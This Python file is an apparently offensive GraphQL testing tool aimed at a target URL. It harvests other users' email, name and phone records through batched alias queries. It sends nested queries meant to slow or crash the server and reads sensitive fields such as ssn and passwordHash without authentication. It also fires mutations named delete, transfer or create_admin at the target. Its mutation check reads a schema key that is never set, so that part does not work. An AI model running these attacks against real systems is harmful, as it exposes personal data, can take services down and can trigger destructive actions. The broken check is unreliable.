#!/usr/bin/env python3
"""
graphql_deep.py — GraphQL Deep Security Tester

Beyond introspection: batch IDOR, nested DoS, field-level auth bypass,
alias enumeration, mutation discovery.

Usage:
    python3 graphql_deep.py --url https://target.com/graphql --auth "Bearer TOKEN"
"""
import json
import os
import re
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    requests = None

# ── GraphQL Detection Paths ────────────────────────────────────────────────────

GQL_PATHS = [
    "/graphql", "/graphql/", "/graphiql", "/graphql/console",
    "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
    "/v1/graphql", "/v2/graphql",
    "/gql", "/query", "/api/gql",
    "/graphql/v1", "/graphql/v2",
    "/playground", "/explorer",
]

# ── Introspection Queries ──────────────────────────────────────────────────────

INTROSPECTION_FULL = """query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args {
          name
          type { name kind }
        }
      }
    }
  }
}"""

INTROSPECTION_SIMPLE = """{__schema{types{name,fields{name,type{name}}}}}"""

# ── DoS Payloads ──────────────────────────────────────────────────────────────

def nested_query(depth: int = 10, field: str = "user",
                 subfield: str = "friends") -> str:
    """Generate deeply nested query for DoS testing."""
    q = "{ " + field + " { "
    for _ in range(depth):
        q += subfield + " { "
    q += "id " + "} " * (depth + 1) + "}"
    return q


class GraphQLDeepTester:
    """Deep GraphQL security tester."""

    def __init__(self, target_url: str = ""):
        self.target_url = target_url
        self.gql_endpoint = ""
        self.schema = {}
        self.findings = []
        self.session = requests.Session() if requests else None

    def discover_endpoint(self, base_url: str,
                          headers: dict = None) -> dict:
        """Discover GraphQL endpoint by testing common paths."""
        headers = headers or {}
        test_query = {"query": "{__typename}"}

        for path in GQL_PATHS:
            url = base_url.rstrip("/") + path
            try:
                resp = self.session.post(
                    url, json=test_query, headers=headers, timeout=5)
                if resp.status_code == 200:
                    body = resp.text
                    if "__typename" in body or "data" in body or "errors" in body:
                        self.gql_endpoint = url
                        return {"found": True, "url": url,
                                "status": resp.status_code}
            except Exception:
                continue

            # Try GET with query param
            try:
                resp = self.session.get(
                    f"{url}?query={{__typename}}",
                    headers=headers, timeout=5)
                if resp.status_code == 200 and ("data" in resp.text or "errors" in resp.text):
                    self.gql_endpoint = url
                    return {"found": True, "url": url, "method": "GET"}
            except Exception:
                continue

        return {"found": False}

    def test_introspection(self, headers: dict = None) -> dict:
        """Test if introspection is enabled (often unauthenticated)."""
        headers = headers or {}
        url = self.gql_endpoint or self.target_url
        result = {
            "type": "INTROSPECTION",
            "url": url,
            "enabled": False,
            "types": [],
            "mutations": [],
        }

        for query in [INTROSPECTION_FULL, INTROSPECTION_SIMPLE]:
            try:
                resp = self.session.post(
                    url, json={"query": query}, headers=headers, timeout=10)

                if resp.status_code == 200:
                    data = resp.json()
                    schema_data = data.get("data", {}).get("__schema", {})
                    if schema_data:
                        result["enabled"] = True
                        self.schema = schema_data

                        # Extract types and fields
                        for t in schema_data.get("types", []):
                            if not t["name"].startswith("__"):
                                fields = [f["name"] for f in (t.get("fields") or [])]
                                result["types"].append({
                                    "name": t["name"],
                                    "kind": t.get("kind"),
                                    "fields": fields[:20],
                                })

                        # Extract mutations
                        mutation_type = schema_data.get("mutationType", {})
                        if mutation_type:
                            for t in schema_data.get("types", []):
                                if t["name"] == mutation_type.get("name"):
                                    result["mutations"] = [
                                        f["name"] for f in (t.get("fields") or [])]

                        self.findings.append(result)
                        return result
            except Exception:
                continue

        # Test unauthenticated introspection
        try:
            resp = self.session.post(
                url, json={"query": INTROSPECTION_SIMPLE}, timeout=10)
            if resp.status_code == 200 and "__schema" in resp.text:
                result["enabled"] = True
                result["unauthenticated"] = True
                result["severity"] = "MEDIUM"
                self.findings.append(result)
        except Exception:
            pass

        return result

    def test_batch_idor(self, field: str = "user",
                        id_field: str = "id",
                        data_fields: list = None,
                        headers: dict = None,
                        id_range: tuple = (1, 50)) -> dict:
        """Test IDOR via GraphQL alias batching — 50 users in one request."""
        headers = headers or {}
        data_fields = data_fields or ["email", "name", "phone"]
        url = self.gql_endpoint or self.target_url

        result = {
            "type": "BATCH_IDOR",
            "url": url,
            "vulnerable": False,
            "leaked_records": 0,
            "data_preview": [],
        }

        # Build batched aliases query
        fields_str = " ".join(data_fields)
        aliases = []
        for i in range(id_range[0], min(id_range[1], 101)):
            aliases.append(f'u{i}: {field}({id_field}: {i}) {{ {fields_str} }}')

        query = "{ " + " ".join(aliases) + " }"

        try:
            resp = self.session.post(
                url, json={"query": query}, headers=headers, timeout=15)

            if resp.status_code == 200:
                data = resp.json().get("data", {})
                records_found = sum(1 for v in data.values() if v is not None)

                if records_found > 1:
                    result["vulnerable"] = True
                    result["leaked_records"] = records_found
                    result["severity"] = "CRITICAL"
                    # Preview first 3 records
                    for k, v in list(data.items())[:3]:
                        if v:
                            result["data_preview"].append(v)
                    self.findings.append(result)

        except Exception as e:
            result["error"] = str(e)

        # Also try string UUIDs
        uuid_query = f'{{ a1: {field}({id_field}: "00000000-0000-0000-0000-000000000001") {{ {fields_str} }} }}'
        try:
            resp = self.session.post(
                url, json={"query": uuid_query}, headers=headers, timeout=5)
            if resp.status_code == 200 and "data" in resp.text:
                result["uuid_format_supported"] = True
        except Exception:
            pass

        return result

    def test_nested_dos(self, headers: dict = None,
                        max_depth: int = 15) -> dict:
        """Test for nested query DoS (resource exhaustion)."""
        headers = headers or {}
        url = self.gql_endpoint or self.target_url
        result = {
            "type": "NESTED_QUERY_DOS",
            "url": url,
            "vulnerable": False,
            "max_depth_allowed": 0,
        }

        # Detect available relationship fields from schema
        rel_fields = []
        for t in self.schema.get("types", []):
            for f in (t.get("fields") or []):
                ftype = f.get("type", {})
                if ftype.get("kind") in ("OBJECT", "LIST"):
                    rel_fields.append(f["name"])

        test_field = rel_fields[0] if rel_fields else "user"
        sub_field = rel_fields[1] if len(rel_fields) > 1 else "friends"

        for depth in [5, 10, 15, 20, 25]:
            if depth > max_depth:
                break

            query = nested_query(depth, test_field, sub_field)
            try:
                t0 = time.time()
                resp = self.session.post(
                    url, json={"query": query}, headers=headers, timeout=15)
                elapsed = time.time() - t0

                if resp.status_code == 200:
                    result["max_depth_allowed"] = depth
                    if elapsed > 3:
                        result["vulnerable"] = True
                        result["severity"] = "MEDIUM"
                        result["evidence"] = f"Depth {depth} took {elapsed:.1f}s"
                elif resp.status_code >= 500:
                    result["vulnerable"] = True
                    result["severity"] = "HIGH"
                    result["evidence"] = f"Server crashed at depth {depth}"
                    break
            except requests.exceptions.Timeout:
                result["vulnerable"] = True
                result["severity"] = "HIGH"
                result["evidence"] = f"Server timed out at depth {depth}"
                break
            except Exception:
                continue

        if result["vulnerable"]:
            self.findings.append(result)

        return result

    def test_field_auth(self, headers: dict = None,
                        no_auth_headers: dict = None) -> dict:
        """Test field-level authorization gaps."""
        headers = headers or {}
        no_auth_headers = no_auth_headers or {}
        url = self.gql_endpoint or self.target_url
        result = {
            "type": "FIELD_AUTH",
            "url": url,
            "unprotected_fields": [],
            "vulnerable": False,
        }

        sensitive_fields = [
            "email", "phone", "ssn", "address", "password", "passwordHash",
            "secret", "token", "apiKey", "creditCard", "salary", "dob",
            "role", "isAdmin", "permissions", "internalId",
        ]

        # Get types from schema
        for t in self.schema.get("types", []):
            if t["name"].startswith("__") or t.get("kind") != "OBJECT":
                continue

            fields = [f["name"] for f in (t.get("fields") or [])]
            sensitive_hits = [f for f in fields if f.lower() in
                            [s.lower() for s in sensitive_fields]]

            if not sensitive_hits:
                continue

            # Try querying sensitive fields without auth
            query = f'{{ {t["name"].lower()} {{ {" ".join(sensitive_hits)} }} }}'
            try:
                resp = self.session.post(
                    url, json={"query": query}, headers=no_auth_headers, timeout=8)
                if resp.status_code == 200:
                    data = resp.json().get("data", {})
                    if data and any(v is not None for v in
                                   (data.get(t["name"].lower()) or {}).values()):
                        result["unprotected_fields"].append({
                            "type": t["name"],
                            "fields": sensitive_hits,
                            "accessible_without_auth": True,
                        })
                        result["vulnerable"] = True
                        result["severity"] = "HIGH"
            except Exception:
                continue

        if result["vulnerable"]:
            self.findings.append(result)

        return result

    def test_mutation_abuse(self, headers: dict = None) -> dict:
        """Test for dangerous mutations accessible to regular users."""
        headers = headers or {}
        url = self.gql_endpoint or self.target_url
        result = {
            "type": "MUTATION_ABUSE",
            "url": url,
            "dangerous_mutations": [],
            "vulnerable": False,
        }

        dangerous_keywords = [
            "delete", "remove", "admin", "create_admin", "update_role",
            "reset_password", "set_password", "grant", "revoke",
            "transfer", "withdraw", "promote", "ban", "suspend",
        ]

        for mutation_name in (self.schema.get("mutations", []) or []):
            if any(kw in mutation_name.lower() for kw in dangerous_keywords):
                # Try to call it (with safe dummy values)
                query = f'mutation {{ {mutation_name}(input: {{}}) {{ __typename }} }}'
                try:
                    resp = self.session.post(
                        url, json={"query": query}, headers=headers, timeout=5)
                    if resp.status_code == 200:
                        errors = resp.json().get("errors", [])
                        # If no auth error but argument error, mutation is accessible
                        auth_denied = any("auth" in str(e).lower() or
                                        "unauthorized" in str(e).lower() or
                                        "forbidden" in str(e).lower()
                                        for e in errors)
                        if not auth_denied:
                            result["dangerous_mutations"].append({
                                "name": mutation_name,
                                "accessible": True,
                                "errors": [str(e)[:100] for e in errors[:2]],
                            })
                            result["vulnerable"] = True
                            result["severity"] = "HIGH"
                except Exception:
                    continue

        if result["vulnerable"]:
            self.findings.append(result)
        return result

    def run_all(self, base_url: str = "", headers: dict = None) -> dict:
        """Run all GraphQL tests."""
        headers = headers or {}
        base_url = base_url or self.target_url

        # Step 1: Discover endpoint
        if not self.gql_endpoint:
            discovery = self.discover_endpoint(base_url, headers)
            if not discovery.get("found"):
                return {"error": "No GraphQL endpoint found", "tested_paths": GQL_PATHS}

        results = {
            "endpoint": self.gql_endpoint,
            "introspection": self.test_introspection(headers),
            "batch_idor": self.test_batch_idor(headers=headers),
            "nested_dos": self.test_nested_dos(headers),
            "field_auth": self.test_field_auth(headers),
            "mutation_abuse": self.test_mutation_abuse(headers),
            "total_findings": len(self.findings),
        }
        return results

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/graphql")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"graphql_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))
